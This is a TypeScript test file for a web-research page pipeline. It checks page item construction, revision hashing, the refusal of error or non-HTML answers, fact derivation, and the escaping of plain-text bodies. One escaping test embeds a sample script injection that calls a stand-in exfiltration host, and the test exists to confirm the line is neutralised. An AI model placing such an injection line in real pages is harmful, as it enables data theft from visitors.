import { createHash } from "node:crypto";
import { EvidenceId, LocalEntityId, RawItem, Timestamp } from "@intelligence/contracts";
import { EntityId, FetcherAnswer, PageUrl, ResearchRequestId, SourceAccountId } from "@intelligence/contracts/personal";
import { describe, expect, it } from "vitest";
import { parse } from "../claim-pipeline/parse.ts";
import { pipelineItemOf } from "../items/adapter.ts";
import { deriveItem } from "../items/derive.ts";
import type { ItemContext } from "../items/types.ts";
import { PERSONAL_LIMITS } from "../limits.ts";
import { THE_OWNER } from "../owner.ts";
import { pageItem, pagePayloadForParse } from "./page.ts";

const account = SourceAccountId.parse("acc_01JABCDEFGHJKMNPQRSTVWXYZ0");
const at = Timestamp.parse("2026-10-05T12:00:00.000Z");
const url = PageUrl.parse("https://profiles.example/people/mara-ellison");
const request = ResearchRequestId.parse("rsq_01JABCDEFGHJKMNPQRSTVWXYZ0");
const about = EntityId.parse("ent_01JABCDEFGHJKMNPQRSTVWXYZ1");

const HTML =
  "<html><head><title>Mara Ellison | Profiles</title></head><body><h1>Mara Ellison</h1><p>Studio director at Ellison Studio.</p></body></html>";
const answer = (body: string, mediaType = "text/html", at: string = url) =>
  FetcherAnswer.parse({
    kind: "page",
    url: at,
    status: 200,
    mediaType,
    body: Buffer.from(body, "utf8").toString("base64"),
    outcome: null,
  });

// An identity port that fails the test if anything on a page is ever resolved.
const asked: unknown[] = [];
const ctx: ItemContext = {
  evidenceId: EvidenceId.parse("evi_01JABCDEFGHJKMNPQRSTVWXYZ0"),
  revision: 0,
  compartment: "public",
  ownerAddresses: ["avery@quinn.test"],
  ownerEntity: LocalEntityId.parse("ent_01JABCDEFGHJKMNPQRSTVWXYZ0"),
  identity: {
    resolve: async (mention) => {
      asked.push(mention);
      return { outcome: "not_a_person" };
    },
  },
  page: { requestId: request, about, names: ["Mara Ellison"] },
};

describe("pageItem", () => {
  it("a page item parses as RawItem, sourceItemId the canonical URL, revisionTag the body's SHA-256", () => {
    const item = pageItem(account, url, answer(HTML), at);
    expect(RawItem.parse(item)).toEqual(item);
    expect(item).toEqual({
      sourceKind: "web_research",
      sourceAccount: account,
      sourceItemId: url,
      revisionTag: createHash("sha256").update(HTML, "utf8").digest("hex"),
      observedAt: at,
      depth: "full",
      changeKind: "live",
      payload: Buffer.from(HTML, "utf8").toString("base64"),
      mediaType: "text/html",
      permissions: { scope: "organization" },
      markers: ["web"],
    });
  });

  it("the same body is the same revision; a new body a new one", () => {
    expect(pageItem(account, url, answer(HTML), at).revisionTag).toBe(
      pageItem(account, url, answer(HTML), Timestamp.parse("2026-10-06T00:00:00.000Z")).revisionTag,
    );
    expect(pageItem(account, url, answer(`${HTML} `), at).revisionTag).not.toBe(
      pageItem(account, url, answer(HTML), at).revisionTag,
    );
  });

  it("refuses an answer with no body, of another URL, or not of text/html or text/plain", () => {
    const refused = (fn: () => unknown) => {
      try {
        fn();
      } catch (error) {
        return (error as { code?: string }).code;
      }
      return "stored";
    };
    const none = FetcherAnswer.parse({ kind: "page", url, status: 404, mediaType: null, body: null, outcome: "gone" });
    expect(refused(() => pageItem(account, url, none, at))).toBe("not_a_page");
    expect(refused(() => pageItem(account, url, answer(HTML, "text/html", "https://profiles.example/other"), at))).toBe(
      "not_a_page",
    );
    expect(refused(() => pageItem(account, url, answer("{}", "application/json"), at))).toBe("not_a_page");
    // A body on an answer that is not 2xx is an error page, never a revision.
    const errorPage = FetcherAnswer.parse({
      kind: "page",
      url,
      status: 404,
      mediaType: "text/html",
      body: Buffer.from(HTML).toString("base64"),
      outcome: null,
    });
    expect(refused(() => pageItem(account, url, errorPage, at))).toBe("not_a_page");
    expect(refused(() => pageItem(account, url, answer("plain", "text/plain"), at))).toBe("stored");
  });
});

describe("page facts", () => {
  it("deriveItem gives a page its facts: url, title, request, about and names", async () => {
    const facts = await deriveItem(pageItem(account, url, answer(HTML), at), ctx, PERSONAL_LIMITS);
    expect(facts).toEqual({
      kind: "page",
      members: { participantMembers: [THE_OWNER] },
      page: { url, title: "Mara Ellison | Profiles", requestId: request, about, names: ["Mara Ellison"] },
    });
  });

  it("page facts make no person, account, alias, domain, interaction or event", async () => {
    asked.length = 0;
    const mailLike = `<html><head><title>Contact</title></head><body><p>From: Mara Ellison &lt;mara@ellisonstudio.example&gt;</p><p>Call 555-0101 or write to board@harbortrust.example.</p></body></html>`;
    const facts = await deriveItem(pageItem(account, url, answer(mailLike), at), ctx, PERSONAL_LIMITS);
    expect(asked).toEqual([]);
    expect(Object.keys(facts).sort()).toEqual(["kind", "members", "page"]);
    expect(facts.kind === "page" && Object.keys(facts.page).sort()).toEqual([
      "about",
      "names",
      "requestId",
      "title",
      "url",
    ]);
  });

  it("a page with no request in its context is refused, never stored as a page of nobody's request", async () => {
    const { page: _page, ...bare } = ctx;
    await expect(deriveItem(pageItem(account, url, answer(HTML), at), bare, PERSONAL_LIMITS)).rejects.toMatchObject({
      code: "no_page_request",
    });
  });

  it("a text/plain page has no title, and a page the parse refuses keeps its facts with none", async () => {
    const plain = await deriveItem(
      pageItem(account, url, answer("Mara Ellison\nStudio director.", "text/plain"), at),
      ctx,
      PERSONAL_LIMITS,
    );
    expect(plain.kind === "page" && plain.page.title).toBeNull();
    const tooDeep = `<html><head><title>Deep</title></head><body>${"<div>".repeat(5000)}x${"</div>".repeat(5000)}</body></html>`;
    const deep = await deriveItem(pageItem(account, url, answer(tooDeep), at), ctx, PERSONAL_LIMITS);
    expect(deep).toEqual({
      kind: "page",
      members: { participantMembers: [THE_OWNER] },
      page: { url, title: null, requestId: request, about, names: ["Mara Ellison"] },
    });
  });
});

describe("pagePayloadForParse", () => {
  it("a text/plain body is escaped and parses with the shared parse", async () => {
    const body =
      "Board of Harbor Trust\n<script>fetch('https://exfil.example/')</script> & <b>chair</b>: Mara Ellison\n";
    const item = pageItem(account, url, answer(body, "text/plain"), at);
    const wrapped = pagePayloadForParse(item);
    expect(wrapped.mediaType).toBe("text/html");
    expect(new TextDecoder().decode(wrapped.payload)).toBe(
      "<pre>Board of Harbor Trust\n&lt;script&gt;fetch('https://exfil.example/')&lt;/script&gt; &amp; &lt;b&gt;chair&lt;/b&gt;: Mara Ellison\n</pre>",
    );
    const parsed = await parse(
      { ...pipelineItemOf(item, ctx), mediaType: wrapped.mediaType },
      wrapped.payload,
      PERSONAL_LIMITS,
    );
    expect(parsed.texts[""]).toContain("<script>fetch('https://exfil.example/')</script> & <b>chair</b>: Mara Ellison");
  });

  it("an HTML body is handed over unchanged", () => {
    const item = pageItem(account, url, answer(HTML), at);
    const wrapped = pagePayloadForParse(item);
    expect(wrapped).toEqual({ mediaType: "text/html", payload: new Uint8Array(Buffer.from(HTML, "utf8")) });
  });
});
